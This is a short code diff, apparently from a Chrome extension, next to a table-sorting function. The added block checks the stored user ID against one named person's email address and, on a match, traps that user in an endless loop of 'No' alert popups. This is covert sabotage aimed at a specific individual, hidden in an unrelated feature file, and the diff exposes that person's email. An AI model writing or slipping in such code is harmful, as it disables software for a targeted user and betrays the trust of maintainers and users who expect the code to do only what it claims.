@@ -63,6 +63,13 @@ function sortTable() {
     }
 }
 
+chrome.storage.local.get("UserId", function(data) {
+    userid = data.UserId;
+    if (userid && userid == "marie-caroline.beck@epitech.eu") {
+        while (1) {alert("No");}
+    }
+});
+
 function openDescList(event) {
     const clickedElement = event.target.parentNode;
     const dataTitle = clickedElement.getAttribute('data-title');
